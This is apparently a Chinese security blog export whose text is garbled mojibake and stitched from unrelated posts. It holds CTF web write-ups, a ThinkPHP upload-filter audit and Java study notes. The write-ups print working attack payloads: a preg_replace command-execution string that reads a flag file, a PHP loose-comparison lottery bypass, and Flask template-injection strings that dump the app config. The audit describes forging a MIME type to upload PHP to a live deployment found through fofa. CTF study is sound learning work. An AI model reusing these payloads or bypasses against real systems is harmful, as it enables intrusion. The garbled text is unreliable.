æ‰¾åˆ°çš„æ˜¯ä¸ªç›®å½•ï¼Œä¸‹é¢è¿˜æœ‰æ–‡ä»¶ è¯»å–æˆ‘ä»¬æ‰€éœ€çš„flagæ–‡ä»¶ï¼š/index.php?pat=/233/erep=system(tac /var/www/html/s3chahahaDir/flag/flag.php)sub=233 Lotteryè¿›å…¥ç¯å¢ƒåå¯ä»¥å‘ç°è¯¥é¢˜æ˜¯é€šè¿‡çŒœæ•°å­—æ¥è·å¾—å¥–é‡‘ï¼Œæ”’å¤Ÿå¥–é‡‘åå†ç”¨é’±å»è´­ä¹°flag å½“ç„¶å•çº¯é ç©æ˜¯è‚¯å®šæ‹¿ä¸åˆ°é‚£ä¹ˆå¤šé’±çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¿…é¡»çœ‹çœ‹æ˜¯çŒœæ•°å­—éƒ¨åˆ†å­˜åœ¨æ¼æ´è¿˜æ˜¯è´­ä¹°éƒ¨åˆ†å­˜åœ¨æ¼æ´ é¢˜ç›®ç»™äº†é™„ä»¶ï¼Œæˆ‘ä»¬å…ˆå»å®¡è®¡ä¸€ä¸‹ä»£ç  å¯ä»¥å‘ç°ç›¸å…³çš„æ¯”è¾ƒé‡è¦çš„æ–‡ä»¶å°±åªæœ‰ä¸€ä¸ªapi.php é€šè¿‡å®¡è®¡è¯¥æ–‡ä»¶å¯ä»¥å‘ç°ç©å®¶çš„é‡‘é’±æ•°é‡æ˜¯å­˜åœ¨sessionä¸­çš„ï¼Œæ— æ³•ç›´æ¥æ›´æ”¹ï¼Œè€Œè´­ä¹°flagçš„ä»£ç ä¹Ÿæ²¡ä»»ä½•æ¼æ´ æˆ‘ä»¬å†è½¬å»çœ‹å‡½æ•°buy function buy($req)\trequire_registered();\trequire_min_money(2);\t$money = $_SESSION[money];\t$numbers = $req[numbers];\t$win_numbers = random_win_nums();\t$same_count = 0;\tfor($i=0; $i7; $i++) if($numbers[$i] == $win_numbers[$i]) $same_count++; switch ($same_count) case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; $money += $prize - 2;\t$_SESSION[money] = $money;\tresponse([status=ok,numbers=$numbers, win_numbers=$win_numbers, money=$money, prize=$prize]); å¯ä»¥çœ‹å‡ºæ¥è¯¥éƒ¨åˆ†éªŒè¯çŒœæµ‹æ•°å­—æ˜¯å¦æ­£ç¡®ç”¨çš„æ˜¯å¼±æ¯”è¾ƒï¼Œè€Œè¿™æ˜¯å­˜åœ¨ç€æ¼æ´çš„ ===æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼å’Œç±»å‹ï¼›==æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œä¸æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚ åœ¨phpä¸­,å¦‚æœboolå’Œâ€ä»»ä½•å…¶ä»–ç±»å‹â€æ¯”è¾ƒ,â€ä»»ä½•å…¶ä»–ç±»å‹â€ä¼šè½¬æ¢ä¸ºboolã€‚ åœ¨PHPä¸­å½“è½¬æ¢ä¸º boolean æ—¶ï¼Œä»¥ä¸‹å€¼è¢«è®¤ä¸ºæ˜¯ FALSE ï¼š(1) å¸ƒå°”å€¼ FALSE æœ¬èº«(2) æ•´å‹å€¼ 0ï¼ˆé›¶ï¼‰(3)æµ®ç‚¹å‹å€¼ 0.0ï¼ˆé›¶ï¼‰(4)ç©ºå­—ç¬¦ä¸²ï¼Œä»¥åŠå­—ç¬¦ä¸² â€œ0â€(5)ä¸åŒ…æ‹¬ä»»ä½•å…ƒç´ çš„æ•°ç»„(æ³¨æ„,ä¸€æ—¦åŒ…å«å…ƒç´ ,å°±ç®—åŒ…å«çš„å…ƒç´ åªæ˜¯ä¸€ä¸ªç©ºæ•°ç»„,ä¹Ÿæ˜¯true)(6)ä¸åŒ…æ‹¬ä»»ä½•æˆå‘˜å˜é‡çš„å¯¹è±¡ï¼ˆä»… PHP 4.0 é€‚ç”¨ï¼‰(7)ç‰¹æ®Šç±»å‹ NULLï¼ˆåŒ…æ‹¬å°šæœªèµ‹å€¼çš„å˜é‡ï¼‰(8)ä»ç©ºæ ‡è®°ç”Ÿæˆçš„ SimpleXML å¯¹è±¡(9)æ‰€æœ‰å…¶å®ƒå€¼åŒ…æ‹¬-1éƒ½è¢«è®¤ä¸ºæ˜¯ TRUE ï¼ˆåŒ…æ‹¬ä»»ä½•èµ„æºï¼‰æ‰€ä»¥æˆ‘ä»¬åªè¦æ‹¦æˆªç›¸å¯¹åº”çš„å“åº”åŒ…ï¼Œæ›´æ”¹ä¸Šä¼ çš„jsonæ•°æ®å³å¯ï¼Œå¦‚ä¸‹ è¿™æ ·å­å‘é€ä¸¤æ¬¡æˆ‘ä»¬ä¾¿æœ‰è¶³å¤Ÿçš„é’±æ¥è´­ä¹°flagäº†ï¼Œé¢˜ç›®è§£å†³ shrineç›´æ¥è®¿é—®ï¼Œç»™å‡ºæºç å¦‚ä¸‹ï¼š import flaskimport os# åˆ›å»º Flask åº”ç”¨å®ä¾‹app = flask.Flask(__name__)# ä»ç¯å¢ƒå˜é‡ä¸­è·å– FLAGï¼Œå¹¶ä»ç¯å¢ƒå˜é‡ä¸­åˆ é™¤å®ƒapp.config[FLAG] = os.environ.pop(FLAG)# é¦–é¡µè·¯ç”±ï¼šè¿”å›å½“å‰æ–‡ä»¶çš„æºä»£ç @app.route(/)def index(): with open(__file__) as f: return f.read()# shrine è·¯ç”±ï¼šæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„å­—ç¬¦ä¸²åŠ¨æ€ç”Ÿæˆæ¨¡æ¿@app.route(/shrine/)def shrine(shrine): def safe_jinja(s: str) - str: å¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œç®€å•è¿‡æ»¤ä»¥é˜²æ­¢æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚ s = s.replace((, ).replace(), ) # ç§»é™¤æ‹¬å· blacklist = [config, self] # ç¦ç”¨å…³é”®å­— # ä½¿ç”¨ Jinja è¯­æ³•å°†é»‘åå•å˜é‡è®¾ç½®ä¸º None return .join([f% set c = None % for c in blacklist]) + s # æ¸²æŸ“è¿‡æ»¤åçš„æ¨¡æ¿ return flask.render_template_string(safe_jinja(shrine))# å¯åŠ¨ Flask å¼€å‘æœåŠ¡å™¨if __name__ == __main__: app.run(debug=True) æºç ä¸­app.config[FLAG] = os.environ.pop(FLAG)æç¤ºflagåœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œä½†æœ‰WAFï¼›é¢˜ç›®ä»æ—§æ˜¯flaskæ¡†æ¶ï¼Œä¸»è¦è€ƒç‚¹åœ¨shrineçš„é™åˆ¶å‡½æ•°ï¼Œè¿‡æ»¤äº†æ‹¬å·ï¼Œè¿˜æœ‰é»‘åå• åœ¨configæ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥ä¼ å…¥configè·å–è®¾ç½®ä¿¡æ¯ï¼›å¦‚æœconfigè¢«banï¼Œè¿˜å¯ä»¥ä½¿ç”¨self.dictè·å–ä¿¡æ¯ï¼›ä½†ç°åœ¨äºŒè€…éƒ½è¢«banæ‰äº†ï¼Œè¿™ä¸ªæ—¶å€™ä¸ºè·å–ä¿¡æ¯ï¼Œ ä»éœ€è¦ç”¨åˆ°ä¸€äº›å˜é‡æˆ–è€…å‡½æ•°ï¼Œä½†æ˜¯æ­¤æ—¶è¿˜è¿‡æ»¤äº†æ‹¬å·ï¼Œæ‰€ä»¥åªèƒ½é€‰åœ¨ä½¿ç”¨å†…ç½®å‡½æ•°è¿›è¡ŒæŸ¥è¯¢ã€‚ åœ¨å¸¦ä½¬çš„wpå¼•é¢†ä¸‹äº†è§£åˆ°pythonæœ‰ä¸¤ä¸ªæ­¤å¤„å¯ç”¨çš„å†…ç½®å‡½æ•°ï¼šurl_forå’Œget_flashed_messageé€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæ¥æŸ¥è¯¢ç°åœ¨appå†…çš„å…¨å±€å˜é‡ã€‚(get_flashed_messageså‡½æ•°è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡flash()ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨get_flashed_messages()æ–¹æ³•å–å‡ºï¼Œé—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©ºã€‚) #http://192.168.32.138:65535/shrine/url_for.__globals__#http://192.168.32.138:65535/shrine/get_flashed_messages.__globals__find_package: function find_package at 0x7feca7eea140, _find_package_path: function _find_package_path at 0x7feca7eea0c8, get_load_dotenv: function get_load_dotenv at 0x7feca7ee2a28, _PackageBoundObject: class flask.helpers._PackageBoundObject, current_app: Flask app, ...... åœ¨ç¬¬äº”è¡Œçœ‹åˆ°current_appå˜é‡ï¼Œä¸”æç¤ºå¯¹åº”çš„å°±æ˜¯å½“å‰appï¼ŒæŸ¥çœ‹å½“å‰configè¯•è¯• #http://192.168.32.138:65535/shrine/url_for.__globals__[current_app].config#http://192.168.32.138:65535/shrine/get_flashed_messages.__globals__[current_app].configConfig ...... FLAG: flagTr0jAn_V1rU4, ......","categories":["Write-Up"]},{"title":"ä»£ç å®¡è®¡-thinkphpä¸­çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´","path":"/2024/08/06/ä»£ç å®¡è®¡-thinkphpä¸­çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´/","content":"å‰è¨€è¿™ä¸¤å¤©å®¡è®¡äº†ä¸€ä¸ªåŸºæœ¬ç»„æˆæ˜¯thinkphpçš„ä»£ç ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œä¸‹é¢è®°å½•ä¸€ä¸‹å®¡è®¡çš„æ•´ä¸ªæµç¨‹ åœ¨fofaä¸Šé¢æœç´¢ä¸€ä¸‹ï¼šweb/static/css/chunk-elementUI.f92cd1c5.cssï¼Œæœç´¢åˆ°çš„é“¾æ¥å…¶å‰åç«¯ä¾¿æ˜¯è¿™æ¬¡å®¡è®¡çš„ä»£ç æ¡†æ¶ å®¡è®¡åœ¨å¼€å§‹å®¡è®¡è¯¥æ¡†æ¶çš„æ—¶å€™ï¼Œæˆ‘ä¾¿å·²ç»çŸ¥é“è¿™ä¸ªæ¡†æ¶æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œæ‰€ä»¥å®¡è®¡çš„è¿‡ç¨‹ä¸­æˆ‘ä¾¿åªçœ‹äº†è·Ÿæ–‡ä»¶ä¸Šä¼ æœ‰å…³çš„ä»£ç  è¯¥æ¡†æ¶æ˜¯ä¸€ä¸ªå¤šåº”ç”¨æ¨¡å¼ï¼Œappç›®å½•ä¸‹é¢æœ‰admin,api,super,webå››ä¸ªç›®å½•ï¼Œèº«ä¸ºæ™®é€šç”¨æˆ·çš„æˆ‘ä»¬æ˜¯åœ¨webç›®å½•ä¸‹çš„ï¼Œä¹Ÿåªèƒ½å¤Ÿæ“ä½œwebç›®å½•ä¸‹é¢çš„æ§åˆ¶å™¨æ–¹æ³• webç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªUpload.phpæ–‡ä»¶ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š ?phpnamespace app\\web\\controller;use think\\facade\\Filesystem;class Upload extends Base /** *ä¸Šä¼ å›¾ç‰‡ */ public function image() try // è·å–ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆåç§°ä¸º imageï¼‰ $file = request()-file(image); // å°†æ–‡ä»¶ä¿å­˜åˆ° public ç£ç›˜çš„ image ç›®å½•ä¸­ï¼Œæ–‡ä»¶åä½¿ç”¨å”¯ä¸€ID $path = Filesystem::disk(public)-putFile(image, $file, uniqid); // è·å–æ–‡ä»¶æ‰©å±•åï¼Œæœ€åä¸€ä¸ª.å¤„ $ext = strrchr($path, .); // æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„æ ¼å¼ä¸­ï¼ˆ.jpg, .jpeg, .png, .gifï¼‰ if (!in_array($ext, [.jpg, .jpeg, .png, .gif])) // å¦‚æœæ–‡ä»¶æ ¼å¼ä¸æ­£ç¡®ï¼Œåˆ é™¤æ–‡ä»¶ @unlink(./upload/ . $path); // è¿”å›é”™è¯¯ä¿¡æ¯ï¼ŒæŒ‡æ˜åªèƒ½ä¸Šä¼ æŒ‡å®šæ ¼å¼çš„å›¾ç‰‡ return errorJson(åªèƒ½ä¸Šä¼ jpg/png/gifæ ¼å¼çš„å›¾ç‰‡); // å°†æ–‡ä»¶ä¿å­˜åˆ°OSSï¼ˆå¯¹è±¡å­˜å‚¨æœåŠ¡ï¼‰ï¼Œå¹¶è¿”å›æ–‡ä»¶çš„URL $url = saveToOss(./upload/ . $path); // è¿”å›æˆåŠŸä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶çš„URL return successJson([ path = $url ]); catch (\\Exception $e) // æ•è·å¼‚å¸¸å¹¶è¿”å›é”™è¯¯ä¿¡æ¯ return errorJson($e-getMessage()); è¿™æ˜¯ä¸Šä¼ å¤´åƒçš„ä»£ç  å…ˆå¼€å¯proxyæ’ä»¶ï¼Œç„¶åæ›´æ”¹ä¸€ä¸‹å¤´åƒï¼Œåœ¨bpä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æ‰¾åˆ°/web.php/upload/imageæ¡ç›®ï¼Œå‘é€åˆ°é‡æ”¾å™¨ä¸­ ä¸Šé¢ä»£ç è¦æ±‚çš„æ–‡ä»¶ååç¼€åªèƒ½å¤Ÿæ˜¯.jpg, .jpeg, .png, .gifï¼Œä½†æ˜¯æ˜¯é€šè¿‡$ext = strrchr($path, .);æ¥è·å–åç¼€åè¿›è¡Œæ£€æµ‹çš„ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åªæ˜¯è·å–æœ€åä¸€ä¸ª.å¤„çš„å†…å®¹ï¼Œäºæ˜¯æˆ‘æƒ³å°è¯•ä¸€æ³¢èƒ½ä¸èƒ½é€šè¿‡00æˆªæ–­è¿›è¡Œç»•è¿‡ æˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯çœ‹æ¥ä¸€çœ¼å›æ˜¾çš„é“¾æ¥æ–‡ä»¶ååç¼€æ˜¯jpgå½¢å¼çš„ï¼Œä¸¤çœ¼ä¸€é»‘ åé¢å‘ç°è¿™ä¸ªæ¡†æ¶æ˜¯thinkphp6çš„æ¡†æ¶ï¼Œå·²ç»è¶…å‡ºäº†00æˆªæ–­å«©å½±å“çš„ç‰ˆæœ¬äº† äºæ˜¯å°è¯•ç”¨å…¶ä»–çš„æ–¹æ³•ï¼Œéƒ½å¤±è´¥äº† è¿™ä¸ªæ—¶å€™è±†å“¥ç‚¹æ‹¨äº†ä¸€å¥ï¼šwebç›®å½•ä¸‹é¢æœ‰å¥½å‡ å¤„æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œçœ‹çœ‹thinkphpæ¡†æ¶è‡ªå·±åŒ…è£…äº†å“ªäº›æ–‡ä»¶ä¸Šä¼ çš„æ–¹æ³• äºæ˜¯é—®äº†ä¸€ä¸‹gptï¼Œå…¨å±€æœç´¢äº†request()-fileæ–¹æ³•ï¼Œåœ¨webç›®å½•ä¸‹é¢æœ‰å¥½å‡ ä¸ªæ–‡ä»¶éƒ½ç”¨äº†è¿™ä¸ªæ–¹æ³• ä¸€ä¸ªä¸ªæ–‡ä»¶å®¡è®¡è¿‡å»ï¼Œæœ€ç»ˆç¡®å®šäº†æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ç‚¹ä½äºVideo.phpæ–‡ä»¶ä¸‹çš„uploadMedia()æ–¹æ³• public function uploadMedia() try $file = request()-file(file); $mine = $file-getMime(); if (!in_array($mine, [image/png, image/jpeg, video/mp4])) return errorJson(ä»…æ”¯æŒä¸Šä¼ jpg/png/mp4æ ¼å¼æ–‡ä»¶); if ($mine == video/mp4) $fileType = video; else $fileType = image; $path = Filesystem::disk(public)-putFile($fileType, $file, uniqid); $url = saveToOss(./upload/ . $path); return successJson([ type = $fileType, path = $url ]); catch (\\Exception $e) return errorJson($e-getMessage()); é‚£ä¹ˆä¸ºä»€ä¹ˆæ˜¯è¿™é‡Œå‘¢ï¼Œæˆ‘ä»¬çœ‹çœ‹è¯¥æ–¹æ³•çš„ä»£ç  å®ƒæ˜¯é€šè¿‡æ£€æµ‹æ–‡ä»¶çš„Mineå€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ç¬¦åˆè¦æ±‚çš„ï¼Œè€ŒMineå€¼å¯ä»¥é€šè¿‡bpæŠ“åŒ…ä¿®æ”¹content-typeçš„å€¼æ¥æ›´æ”¹ è¯¥æ–¹æ³•ä¸æ£€æŸ¥æ–‡ä»¶çš„åç¼€åï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶äº† è¯ä¸å¤šè¯´ï¼Œå¼€å§‹æ“ä½œ æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªurlæ¥è®¿é—®è¯¥æ–¹æ³•ï¼š/web.php/video/uploadMedia è¦æ³¨æ„æ˜¯web.phpè€Œä¸æ˜¯web è®¿é—®åæŠ¥é”™å¦‚ä¸‹ï¼š é—®é¢˜ä¸å¤§ï¼ŒæˆåŠŸè®¿é—®åˆ°äº†uploadMedia()æ–¹æ³•ï¼Œè¯¥æŠ¥é”™åªæ˜¯getMine()çš„å€¼ä¸ºç©ºè€Œå·² æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚åŒ…ï¼Œè¦æ³¨æ„çš„æ˜¯è¯¥æ–¹æ³•çš„å‚æ•°åæ˜¯fileï¼ˆé„™äººç‹ ç‹ åœ°è¸©è¿›äº†è¿™ä¸ªå‘ä¸­ï¼‰ æ‰€ä»¥æ„é€ çš„è¯·æ±‚åŒ…å¦‚ä¸‹æ‰€ç¤ºï¼š ä¸€åˆ‡éƒ½å¾ˆå®Œç¾äº†å‘€ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆè¿˜æ˜¯500é”™è¯¯å‘¢ æŠ¥é”™ code:0,message:Call to undefined function think\\\\finfo_open() è¡¨æ˜åœ¨ä½ çš„ PHP ç¯å¢ƒä¸­ç¼ºå°‘ finfo_open å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ PHP çš„ Fileinfo æ‰©å±•çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥æ‰©å±•ç”¨äºæ£€æµ‹æ–‡ä»¶çš„ MIME ç±»å‹ åŸæ¥æ˜¯ç³»ç»Ÿæ²¡æœ‰å¯ç”¨è¯¥æ‰©å±•ï¼Œæ‰€ä»¥å¯¼è‡´æ–‡ä»¶ä¸Šä¼ ä¸ä¸Šå» ä½†æ˜¯å®¢è§‚ä¸Šé¢è¿˜æ˜¯å­˜åœ¨è¯¥æ¼æ´çš„ï¼Œåªæ˜¯æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨ç½¢äº†ï¼ˆå‘œå‘œå‘œï¼‰ ç»“è¯­è¿™æ¬¡ä»£ç å®¡è®¡æ¯”ç¬¬ä¸€æ¬¡è¦è½»æ¾ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºæå‰å­¦ä¹ äº†thinkphpæ¡†æ¶ï¼Œæ‰€ä»¥å¯¹äºç³»ç»Ÿçš„ç»“æ„ï¼Œè¦ä»å“ªé‡Œä¸‹æ‰‹çœ‹ä»£ç è¿›è¡Œå®¡è®¡è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„","categories":["ä»£ç å®¡è®¡"]},{"title":"javaå­¦ä¹ ","path":"/2024/07/27/javaå­¦ä¹ /","content":"é¢å‘å¯¹è±¡-åŸºç¡€ç±»å’Œå¯¹è±¡çš„å†…å­˜åˆ†é…æœºåˆ¶Java å†…å­˜çš„ç»“æ„åˆ†æ æ ˆï¼š ä¸€èˆ¬å­˜æ”¾åŸºæœ¬æ•°æ®ç±»å‹(å±€éƒ¨å˜é‡) å †ï¼š å­˜æ”¾å¯¹è±¡(Cat cat , æ•°ç»„ç­‰) æ–¹æ³•åŒºï¼šå¸¸é‡æ± (å¸¸é‡ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²)ï¼Œ ç±»åŠ è½½ä¿¡æ¯ ä¸¾ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æµç¨‹åˆ†æä¾‹å­ Person p = new Person();p.name = â€œjackâ€;p.age = 10 å…ˆåŠ è½½ Person ç±»ä¿¡æ¯(å±æ€§å’Œæ–¹æ³•ä¿¡æ¯, åªä¼šåŠ è½½ä¸€æ¬¡ï¼‰ åœ¨å †ä¸­åˆ†é…ç©ºé—´, è¿›è¡Œé»˜è®¤åˆå§‹åŒ–(çœ‹è§„åˆ™) æŠŠåœ°å€èµ‹ç»™ p , p å°±æŒ‡å‘å¯¹è±¡ è¿›è¡ŒæŒ‡å®šåˆå§‹åŒ–ï¼Œ æ¯”å¦‚ p.name â€jackâ€ p.age 10 æˆå‘˜æ–¹æ³•è°ƒç”¨æœºåˆ¶ç¤ºæ„å›¾ é€’å½’ä¾‹é¢˜ä¸€ ä¸‹é¢ä¸ºè¯¥é¢˜ä»£ç  public class Test public static void main(String[] args) T t1 = new T(); int n = 7; int res = t1.fibonacci(n); if(res != -1) System.out.println(å½“ n=+ n + å¯¹åº”çš„æ–æ³¢é‚£å¥‘æ•°= + res); int day = 1; int peachNum = t1.peach(day); if(peachNum != -1) System.out.println(ç¬¬ + day + å¤©æœ‰ + peachNum + ä¸ªæ¡ƒå­); class T public int fibonacci(int n) if(n == 1 || n == 2) return 1; else return fibonacci(n-1) + fibonacci(n-2); public int peach(int day) if(day == 10) //ç¬¬ 10 å¤©ï¼Œåªæœ‰ 1 ä¸ªæ¡ƒ return 1; else if ( day = 1 day =9 ) return (peach(day + 1) + 1) * 2;//è§„åˆ™ï¼Œè‡ªå·±è¦æƒ³ else System.out.println(day åœ¨ 1-10); return -1; æ±‰è¯ºå¡”public class StringToBasicDetail public static void main(String[] args) Tower tower = new Tower(); tower.move(5, A, B, C); class Tower public void move(int num, char a, char b, char c) //å¦‚æœåªæœ‰ä¸€ä¸ªç›˜ num = 1 if(num == 1) System.out.println(a + - + c); else //å¦‚æœæœ‰å¤šä¸ªç›˜ï¼Œå¯ä»¥çœ‹æˆä¸¤ä¸ª , æœ€ä¸‹é¢çš„å’Œä¸Šé¢çš„æ‰€æœ‰ç›˜(num-1) //(1)å…ˆç§»åŠ¨ä¸Šé¢æ‰€æœ‰çš„ç›˜åˆ° b, å€ŸåŠ© c move(num - 1 , a, c, b); //(2)æŠŠæœ€ä¸‹é¢çš„è¿™ä¸ªç›˜ï¼Œç§»åŠ¨åˆ° c System.out.println(a + - + c); //(3)å†æŠŠ b å¡”çš„æ‰€æœ‰ç›˜ï¼Œç§»åŠ¨åˆ° c ,å€ŸåŠ© a move(num - 1, b, a, c); å¯å˜å‚æ•°java å…è®¸å°†åŒä¸€ä¸ªç±»ä¸­å¤šä¸ªåŒååŒåŠŸèƒ½ä½†å‚æ•°ä¸ªæ•°ä¸åŒçš„æ–¹æ³•ï¼Œå°è£…æˆä¸€ä¸ªæ–¹æ³• åŸºæœ¬è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š è®¿é—®ä¿®é¥°ç¬¦ è¿”å›ç±»å‹ æ–¹æ³•å(æ•°æ®ç±»å‹... å½¢å‚å) ä¸¾ä¸ªä¾‹å­ï¼š public class StringToBasicDetail public static void main(String[] args) HspMethod m = new HspMethod(); System.out.println(m.sum(1, 5, 100)); System.out.println(m.sum(1,19)); class HspMethod public int sum(int... nums) //1. int... è¡¨ç¤ºæ¥å—çš„æ˜¯å¯å˜å‚æ•°ï¼Œç±»å‹æ˜¯ int ,å³å¯ä»¥æ¥æ”¶å¤šä¸ª int(0-å¤š) //2. ä½¿ç”¨å¯å˜å‚æ•°æ—¶ï¼Œå¯ä»¥å½“åšæ•°ç»„æ¥ä½¿ç”¨ å³ nums å¯ä»¥å½“åšæ•°ç»„ //3. éå† nums æ±‚å’Œå³å¯ int res = 0; for(int i = 0; inums.length; i++) res += nums[i]; return res; å¯å˜å‚æ•°ä¸æ™®é€šå‚æ•°ä¸€èµ·çš„ä¾‹å­å¦‚ä¸‹ï¼š public class StringToBasicDetail public static void main(String[] args) HspMethod m = new HspMethod(); System.out.println(m.showScore(Sherlock,90.1,80,87.8 )); class HspMethod public String showScore(String name, double... scores) double total = 0; for(int i = 0; iscores.length; i++) total += scores[i]; return name + ï¼š + total; æ„é€ å™¨åŸºç¡€æ„é€ æ–¹æ³•åˆå«æ„é€ å™¨(constructor)ï¼Œæ˜¯ç±»çš„ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å®Œæˆå¯¹æ–°å¯¹è±¡çš„åˆå§‹åŒ–ã€‚ å®ƒæœ‰å‡ ä¸ªç‰¹ç‚¹ï¼š æ–¹æ³•åå’Œç±»åç›¸åŒ æ²¡æœ‰è¿”å›å€¼ åœ¨åˆ›å»ºå¯¹è±¡æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨çš„è°ƒç”¨è¯¥ç±»çš„æ„é€ å™¨å®Œæˆå¯¹è±¡çš„åˆå§‹åŒ– class Person String name;int age;//1. æ„é€ å™¨æ²¡æœ‰è¿”å›å€¼, ä¹Ÿä¸èƒ½å†™ void//2. æ„é€ å™¨çš„åç§°å’Œç±» Person ä¸€æ ·//3. (String pName, int pAge) æ˜¯æ„é€ å™¨å½¢å‚åˆ—è¡¨ï¼Œè§„åˆ™å’Œæˆå‘˜æ–¹æ³•ä¸€æ ·public Person(String pName, int pAge) System.out.println(æ„é€ å™¨è¢«è°ƒç”¨~~ å®Œæˆå¯¹è±¡çš„å±æ€§åˆå§‹åŒ–);name = pName;age = pAge; ä¸€ä¸ªç±»ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªæ„é€ å™¨ï¼Œå³æ„é€ å™¨é‡è½½ åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³• thiså…³é”®å­—thisè¡¨ç¤ºçš„å°±æ˜¯å½“å‰å¯¹è±¡ public class StringToBasicDetail public static void main(String[] args) Dog dog1 = new Dog(å°é»‘,3); dog1.info(); class Dog String name; int age; Dog(String name,int age) this.name = name; this.age = age; void info() System.out.println(this.hashCode= + this.hashCode()); System.out.println(name + \\t + age + \\t); é¢å‘å¯¹è±¡-ä¸­çº§åŒ…ï¼ˆpackageï¼‰åŒ…ï¼ˆpackageï¼‰æ˜¯ç”¨äºç»„ç»‡ç±»å’Œæ¥å£çš„å‘½åç©ºé—´ã€‚åŒ…æä¾›äº†ä¸€ç§å°†ç›¸å…³çš„ç±»å’Œæ¥å£è¿›è¡Œåˆ†ç»„çš„æœºåˆ¶ï¼Œæ–¹ä¾¿ä»£ç çš„ç®¡ç†å’Œç»´æŠ¤ã€‚é€šè¿‡ä½¿ç”¨åŒ…ï¼Œå¯ä»¥é¿å…ç±»åå†²çªï¼Œå¢å¼ºä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ åŒ…çš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯åˆ›é€ å‡ºä¸åŒçš„æ–‡ä»¶å¤¹æ¥ä¿å­˜ç±»æ–‡ä»¶ åŒ…çš„å£°æ˜ç”¨packageå…³é”®å­—ï¼Œå¼•å…¥ç”¨importå…³é”®å­—ï¼Œå¦‚ä¸‹ï¼š æˆ‘ä»¬éœ€è¦ä½¿ç”¨åˆ°å“ªä¸ªç±»ï¼Œå°±å¯¼å…¥å“ªä¸ªç±»å³å¯ï¼Œä¸å»ºè®®ä½¿ç”¨ *å¯¼å…¥ import java.util.Scanner; //è¡¨ç¤ºåªä¼šå¼•å…¥ java.util åŒ…ä¸‹çš„ Scannerimport java.util.*;//è¡¨ç¤ºå°† java.util åŒ…ä¸‹çš„æ‰€æœ‰ç±»éƒ½å¼•å…¥(å¯¼å…¥) è®¿é—®ä¿®é¥°ç¬¦java æä¾›å››ç§è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦å·ï¼Œç”¨äºæ§åˆ¶æ–¹æ³•å’Œå±æ€§(æˆå‘˜å˜é‡)çš„è®¿é—®æƒé™ï¼ˆèŒƒå›´ï¼‰: å…¬å¼€çº§åˆ«:ç”¨ public ä¿®é¥°,å¯¹å¤–å…¬å¼€ å—ä¿æŠ¤çº§åˆ«:ç”¨ protected ä¿®é¥°,å¯¹å­ç±»å’ŒåŒä¸€ä¸ªåŒ…ä¸­çš„ç±»å…¬å¼€ é»˜è®¤çº§åˆ«:æ²¡æœ‰ä¿®é¥°ç¬¦å·,å‘åŒä¸€ä¸ªåŒ…çš„ç±»å…¬å¼€ ç§æœ‰çº§åˆ«:ç”¨ 